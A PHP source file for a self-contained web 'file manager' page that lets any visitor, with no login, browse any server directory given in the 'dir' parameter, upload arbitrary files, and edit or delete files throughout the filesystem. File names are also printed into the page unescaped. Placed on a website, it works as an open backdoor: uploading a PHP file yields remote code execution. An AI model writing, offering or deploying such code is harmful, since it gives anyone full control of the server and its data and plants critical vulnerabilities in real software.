<?php
// Get the current directory from the query string, default to the root directory
$currentDirectory = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// Normalize and sanitize the directory path
$currentDirectory = realpath($currentDirectory);

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadFile = $currentDirectory . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "<p>File uploaded successfully.</p>";
    } else {
        echo "<p>File upload failed.</p>";
    }
}

// Handle file creation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file'])) {
    $newFileName = $currentDirectory . '/' . basename($_POST['file_name']);
    if (!file_exists($newFileName)) {
        file_put_contents($newFileName, '');
        echo "<p>File created successfully.</p>";
    } else {
        echo "<p>File already exists.</p>";
    }
}

// Handle file editing
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_file'])) {
    $fileToEdit = $currentDirectory . '/' . basename($_POST['file_name']);
    if (file_exists($fileToEdit)) {
        file_put_contents($fileToEdit, $_POST['file_content']);
        echo "<p>File saved successfully.</p>";
    } else {
        echo "<p>File does not exist.</p>";
    }
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $fileToDelete = $currentDirectory . '/' . basename($_POST['file_name']);
    if (file_exists($fileToDelete)) {
        unlink($fileToDelete);
        echo "<p>File deleted successfully.</p>";
    } else {
        echo "<p>File does not exist.</p>";
    }
}

// List files and directories in the current directory
$files = scandir($currentDirectory);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Enhanced File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; }
        ul { list-style: none; padding: 0; }
        li { margin: 5px 0; }
        a { text-decoration: none; color: blue; }
        a:hover { text-decoration: underline; }
        textarea { width: 100%; }
    </style>
</head>
<body>
    <h1>File Manager</h1>

    <h2>Current Directory: <?php echo htmlspecialchars($currentDirectory); ?></h2>

    <h2>Upload File</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>

    <h2>Create File</h2>
    <form method="post">
        <input type="text" name="file_name" placeholder="File name" required>
        <button type="submit" name="create_file">Create</button>
    </form>

    <h2>Edit File</h2>
    <form method="post">
        <select name="file_name">
            <?php foreach ($files as $file): ?>
                <?php if (is_file($currentDirectory . '/' . $file)): ?>
                    <option value="<?php echo $file; ?>"><?php echo $file; ?></option>
                <?php endif; ?>
            <?php endforeach; ?>
        </select>
        <textarea name="file_content" rows="10" placeholder="Enter file content"></textarea>
        <button type="submit" name="save_file">Save</button>
    </form>

    <h2>Delete File</h2>
    <form method="post">
        <select name="file_name">
            <?php foreach ($files as $file): ?>
                <?php if (is_file($currentDirectory . '/' . $file)): ?>
                    <option value="<?php echo $file; ?>"><?php echo $file; ?></option>
                <?php endif; ?>
            <?php endforeach; ?>
        </select>
        <button type="submit" name="delete_file">Delete</button>
    </form>

    <h2>Directory Navigation</h2>
    <form method="get">
        <input type="text" name="dir" value="<?php echo htmlspecialchars($currentDirectory); ?>" placeholder="Enter directory path">
        <button type="submit">Go</button>
    </form>

    <h2>Files and Directories</h2>
    <ul>
        <?php if ($currentDirectory !== '/'): ?>
            <li><a href="?dir=<?php echo urlencode(dirname($currentDirectory)); ?>">[Go Up]</a></li>
        <?php endif; ?>
        <?php foreach ($files as $file): ?>
            <li>
                <?php if (is_dir($currentDirectory . '/' . $file)): ?>
                    <a href="?dir=<?php echo urlencode($currentDirectory . '/' . $file); ?>"><?php echo $file; ?> [Directory]</a>
                <?php else: ?>
                    <a href="<?php echo htmlspecialchars($currentDirectory . '/' . $file); ?>" target="_blank"><?php echo $file; ?> [File]</a>
                <?php endif; ?>
            </li>
        <?php endforeach; ?>
    </ul>
</body>
</html>